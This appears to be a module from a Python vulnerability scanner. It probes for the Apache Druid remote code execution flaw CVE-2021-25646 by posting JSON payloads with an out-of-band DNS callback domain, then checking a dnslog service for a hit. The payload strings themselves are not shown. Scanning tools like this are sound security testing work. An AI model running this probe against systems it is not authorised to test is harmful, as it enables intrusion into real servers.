#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.api.dns import dns
from lib.tool.md5 import md5, random_md5, random_int_1, random_int_2
from lib.tool.logger import logger
from lib.tool import check
from thirdparty import requests
from time import sleep

def cve_2021_25646_scan(self, url):
    ''' Apache Druid 包括执行用户提供的JavaScript的功能嵌入在各种类型请求中的代码, 
        此功能在用于高信任度环境中, 默认已被禁用
            但是, 在 Druid 0.20.0及更低版本中, 
            经过身份验证的用户可以构造传入的json串来控制一些敏感的参数发送恶意请求, 
            利用 Apache Druid 漏洞可以执行任意代码
    '''
    sessid = '244d164411e9b78ca7074ec47f2c4f96'

    vul_info = {}
    vul_info['app_name'] = self.app_name
    vul_info['vul_type'] = 'RCE'
    vul_info['vul_id'] = 'CVE-2021-25646'
    vul_info['vul_method'] = 'POST'
    vul_info['headers'] = {
        'Content-Type': 'application/json;charset=utf-8',
        'Referer': 'http://' + logger.get_domain(url),
        'Origin': 'http://' + logger.get_domain(url),
    }

    headers = self.headers.copy()
    headers.update(vul_info['headers'])

    for payload in self.cve_2021_25646_payloads:
        md = random_md5()                                       # * 随机md5值, 8位
        dns_domain = md + '.' + dns.domain(sessid)              # * dnslog/ceye域名
        
        path = payload['path']
        data = payload['data'].replace('DNSDOMAIN', dns_domain)
        target = url + path

        vul_info['path'] = path
        vul_info['data'] = data
        vul_info['target'] = target

        try:
            res = requests.post(
                target, 
                timeout=self.timeout, 
                headers=headers,
                data=data, 
                proxies=self.proxies, 
                verify=False,
                allow_redirects=False
            )
            logger.logging(vul_info, res.status_code, res)                        # * LOG

            sleep(3)
            md_5 = md5(str(self.random_num))
            if (md_5 in check.check_res(res.text, md_5)
                or md in dns.result(md, sessid)
            ):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Request': res
                }
                return results
        except requests.ConnectTimeout:
            logger.logging(vul_info, 'Timeout')
            return None
        except requests.ConnectionError:
            logger.logging(vul_info, 'Faild')
            return None
        except:
            logger.logging(vul_info, 'Error')
            return None
